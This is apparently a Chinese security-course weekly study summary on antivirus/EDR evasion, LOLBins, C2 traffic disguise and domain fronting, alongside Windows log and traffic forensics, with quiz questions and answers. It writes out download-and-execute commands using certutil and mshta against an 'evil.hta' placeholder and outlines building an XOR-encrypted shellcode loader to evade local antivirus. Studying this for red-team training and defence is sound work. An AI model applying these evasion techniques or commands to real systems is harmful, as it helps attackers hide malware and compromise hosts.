---
title: Week 13：免杀绕过与红蓝对抗 - 周度总结
tags:
  - 学习总结
  - 阶段复盘
categories:
  - 网络安全
date: 2026-04-21
---

# Week 13：免杀绕过与红蓝对抗 (Red Teaming & Defense) - 周度总结

## 📅 本周学习概览

在内网中，最大的敌人不是复杂的网络架构，而是无处不在的杀毒软件 (AV) 和终端检测响应 (EDR)。如果你的工具刚落地就被杀，如果你的流量刚发出就被拦截，那一切渗透技巧都无从谈起。

本周我们学习了**“如何消失”**。我们研究了静态免杀技术，让恶意代码看起来像正常程序；我们学习了流量混淆，让 C2 通信看起来像浏览 Amazon。同时，我们也站在蓝队的视角，学习如何通过日志和流量分析来“抓捕”攻击者。知己知彼，方能百战不殆。

<!--more-->

---

## 📚 每日核心知识回顾

### Day 075：杀软工作原理与静态免杀
- **杀软查杀机制**：
  - **静态特征 (Signature)**：匹配已知病毒的文件 Hash 或特定字节码（如 Shellcode 中的特定 hex 串）。
  - **启发式 (Heuristic)**：通过算法猜测代码意图（如导入表 suspicious imports）。
  - **行为监测 (Behavior)**：监控敏感操作（如注入 explorer.exe, 修改注册表启动项）。
- **静态免杀思路**：
  - **Shellcode 分离**：加载器 (Loader) 与 Shellcode 分开存储（远程加载或图片隐写）。
  - **加密/编码**：XOR, AES, Base64。运行时解密。
  - **源码混淆**：修改变量名，插入花指令，打乱控制流。

### Day 076：动态免杀与白名单利用 (LOLBins)
- **LOLBins (Living Off The Land Binaries)**：利用系统自带的、合法的、签名的程序来执行恶意操作。
  - **Certutil**: 下载文件。`certutil -urlcache -split -f http://...`
  - **Mshta**: 执行 HTA/VBS。`mshta http://.../evil.hta`
  - **Rundll32**: 加载 DLL。
  - **MSBuild**: 编译并执行 C# 代码（XML 格式）。
- **动态免杀**：
  - **Reflective DLL Injection**：内存加载 DLL，不落地。
  - **Syscalls**：直接调用系统内核函数，绕过 R3 层的 Hook (Userland Hooking)。

### Day 077：C2 流量伪装与隐蔽通道
- **Malleable C2 Profile**：CS 的核心配置文件。可以定义 HTTP 请求的 User-Agent, URI, Header, Body 结构。
  - 目标：让流量看起来像 jQuery, Gmail, Amazon, CNN 等正常流量。
- **Domain Fronting (域前置)**：利用 CDN 节点的转发机制，让 C2 流量看起来是发往可信域名（如 `ajax.microsoft.com`），实际转发到攻击者服务器。

### Day 078：Windows 日志分析与取证
- **关键事件 ID (Event ID)**：
  - **4624**: 登录成功（类型 3=网络, 10=远程桌面）。
  - **4625**: 登录失败（暴力破解迹象）。
  - **4688**: 进程创建（CMD 执行了什么命令）。
  - **1102**: 日志被清空（攻击者擦除痕迹）。
- **PowerShell 日志**：开启 Script Block Logging (Event ID 4104)，可以记录混淆后的真实 PS 代码。

### Day 079：流量分析与入侵检测 (IDS)
- **Wireshark 分析**：
  - 过滤 `ip.src == hacker_ip`。
  - 统计会话时长、数据包大小。
  - 导出 HTTP 对象，还原传输的文件。
- **IDS (Snort/Suricata)**：基于规则匹配流量。
  - 规则示例：`alert tcp any any -> any 80 (msg:"SQL Injection"; content:"UNION SELECT";)`。

### Day 080：攻击溯源与威胁情报
- **溯源路径**：IP -> 域名 -> Whois -> 注册人 -> 社工库/Github -> 真实身份。
- **OPSEC (Operations Security) 失败案例**：
  - 个人 ID 注册域名。
  - C2 服务器开放了 SSH/3389 且未修改 Banner。
  - 在恶意样本中留下了 PDB 路径（包含用户名）。

### Day 081：周末闯关 - 免杀 Payload 制作与测试
- **实战场景**：
  1.  使用 MSF 生成 Shellcode。
  2.  编写一个简单的 C/C++ Loader，使用 XOR 加密 Shellcode。
  3.  使用本地安装的火绒/360 进行扫描测试。
  4.  尝试运行并成功上线。

---

## 📝 巩固练习题 (Level 13)

### 一、 概念速查（单选/简答）

1.  **LOLBins 的全称是什么？为什么利用 LOLBins 可以绕过杀软的白名单策略？**
2.  **在 Malleable C2 Profile 中，将 C2 流量伪装成 jQuery 的 `.js` 文件请求，这主要是为了对抗什么设备的检测？**
    A) 杀毒软件 (AV)
    B) 网络流量分析 (NTA) / 防火墙
    C) 主机入侵检测 (HIDS)
    D) 蜜罐
3.  **Event ID 4624 中的 Logon Type 3 和 Logon Type 10 分别代表什么登录方式？**
4.  **什么是“无文件攻击 (Fileless Attack)”？**
5.  **如果攻击者在编译恶意程序时忘记去除 PDB 信息，这会给防御者提供什么线索？**

### 二、 场景分析与安全实践（实战模拟）

6.  **场景：免杀加载器**
    你写了一个 C++ Loader，用 `VirtualAlloc` 申请内存，`memcpy` 写入 Shellcode，然后 `CreateThread` 执行。但是火绒一扫就报毒。
    *   你认为查杀点可能在哪里？（API 调用特征？Shellcode 特征？）
    *   你会尝试用什么技术来隐藏敏感 API 的调用？（提示：动态获取 API 地址 / Syscalls）

7.  **场景：日志分析**
    你在分析一台被黑的服务器日志，发现大量 Event ID 4625，随后有一条 4624 (Type 3)，紧接着是 4688 (cmd.exe)。
    *   请还原攻击者的操作流程。
    *   如果攻击者运行了 `whoami`，你能在日志中看到这个命令的输出结果吗？为什么？

8.  **场景：流量伪装**
    你想配置 CS Profile 使用域前置技术。你需要一个 CDN 提供商。
    *   配置域前置的关键 HTTP Header 是哪个？（提示：Host）
    *   在 DNS 请求中，防御者看到的是谁的 IP？

### 三、 深度思考与综合分析

9.  **随着 EDR 技术的普及，简单的静态免杀已经很难奏效。未来的免杀技术（如 EDR Evasion）主要会集中在哪些方向？（提示：Unhooking, Direct Syscalls, BYOVD）**

10. **如果你是蓝队，发现内网有一台主机疑似中毒，但杀软没报毒。你会采集哪些数据来进行人工研判？（列举 3 种，如：网络连接、启动项...）**

---

## 🔑 参考答案

### 一、 概念速查
1.  **Living Off The Land Binaries**。因为这些程序是微软签名的、系统自带的，默认被杀软和 AppLocker 信任。
2.  **B) 网络流量分析 (NTA) / 防火墙**。
3.  **Type 3**: 网络登录（如 SMB, IPC$）。**Type 10**: 远程交互式登录（RDP）。
4.  **恶意代码不落地（不写入磁盘）**。直接在内存中加载执行（如 PowerShell `IEX`, Reflective DLL）。
5.  **开发者的用户名、项目路径、编译环境**。例如 `C:\Users\BadGuy\Project\HackTool\Release\backdoor.pdb`。

### 二、 场景分析
6.  **免杀加载器**。
    *   查杀点：Shellcode 的特征码（如果未加密），或者 `VirtualAlloc` -> `CreateThread` 这种经典的 Shellcode Loader 行为模式。
    *   技术：使用 **GetProcAddress + LoadLibrary** 动态获取 API；或者使用 **Direct Syscalls**（直接汇编调用内核），绕过用户层 ntdll.dll 的监控。
7.  **日志分析**。
    *   流程：**暴力破解**（大量 4625） -> **破解成功**（4624 Type 3，可能是 SMB） -> **执行命令**（4688，可能是通过 PsExec 或 WMI）。
    *   **不能**。4688 只记录进程创建时的命令行参数（即 `cmd.exe /c whoami`），**不记录标准输出结果**。除非开启了 PowerShell 的 Script Block Logging 且攻击者用的是 PS。
8.  **流量伪装**。
    *   Header: `Host: <attack-domain>`。
    *   防御者看到的是 **CDN 节点的 IP**（如 Cloudflare 或 Cloudfront 的 IP），看不到攻击者的真实 IP。

### 三、 深度思考
9.  **EDR 对抗方向**。
    *   **Unhooking**：检测并恢复 EDR 在内存中挂的 Hook。
    *   **Direct Syscalls**：完全避开用户层 API。
    *   **BYOVD (Bring Your Own Vulnerable Driver)**：带一个有漏洞的合法驱动，加载进内核，利用驱动漏洞在内核层致盲 EDR。
10. **人工研判数据**。
    *   **网络连接** (`netstat -ano`)：是否有异常的外连 IP？
    *   **进程树** (Process Hacker)：是否有 `powershell.exe` 派生自 `winword.exe`？是否有无签名的进程？
    *   **启动项/计划任务** (Autoruns)：是否有奇怪的持久化脚本。
